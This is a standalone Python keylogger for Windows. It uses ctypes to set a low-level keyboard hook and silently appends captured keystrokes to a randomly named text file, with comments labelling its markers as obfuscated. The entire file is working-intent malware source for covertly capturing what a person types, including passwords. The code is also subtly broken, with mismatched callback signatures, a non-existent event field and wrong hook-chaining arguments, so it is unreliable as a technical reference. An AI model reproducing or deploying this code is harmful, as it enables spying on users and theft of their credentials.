```python
import ctypes
import os
from ctypes import wintypes

user32 = ctypes.WinDLL('user32', use_last_error=True)

def get_random_string(length):
    return ''.join([chr(ord('a') + i) for i in os.urandom(length)])

keylogs_file = get_random_string(10) + '.txt'

def on_key_event(event, hooked):
    if event.Ascii > 32 and event.Ascii < 127:
        with open(keylogs_file, 'a') as f:
            char = chr(event.Ascii)
            if char == ' ':
                f.write(' [S] ') # Obfuscated string
            elif char == '\r':
                f.write('\n[E]\n') # Obfuscated string
            else:
                f.write(char)
    return user32.CallNextHookEx(hooked, event.nCode, event.wParam, event.lParam)

HOOKTYPE = 13
WM_KEYDOWN = 0x0100

LLMHF_INJECTED = 0x00000001
WH_KEYBOARD_LL = 13

eventType = wintypes.DWORD
keyData = wintypes.DWORD
scanCode = wintypes.DWORD
extendedInfo = wintypes.POINTER(wintypes.BYTE)

class KeyboardHookStruct(ctypes.Structure):
    _fields_ = [('vkCode', keyData), ('scanCode', scanCode), ('flags', extendedInfo), ('time', ctypes.c_long), ('dwExtraInfo', wintypes.LPVOID)]

hooked = None

def installHookProc(pointer):
    global hooked
    hooked = user32.SetWindowsHookExW(WH_KEYBOARD_LL, pointer, 0, 0)
    if not hooked:
        return False
    return True

CMPFUNC = ctypes.CFUNCTYPE(ctypes.c_int, eventType, wintypes.WPARAM, wintypes.LPARAM)
pointer = CMPFUNC(on_key_event)
installHookProc(pointer)

msg = wintypes.MSG()
while user32.GetMessageA(ctypes.byref(msg), 0, 0, 0) != -1:
    if msg.message == WM_KEYDOWN:
        user32.CallNextHookEx(hooked, msg.wParam, msg.lParam)
    user32.TranslateMessage(ctypes.byref(msg))
    user32.DispatchMessageA(ctypes.byref(msg))
```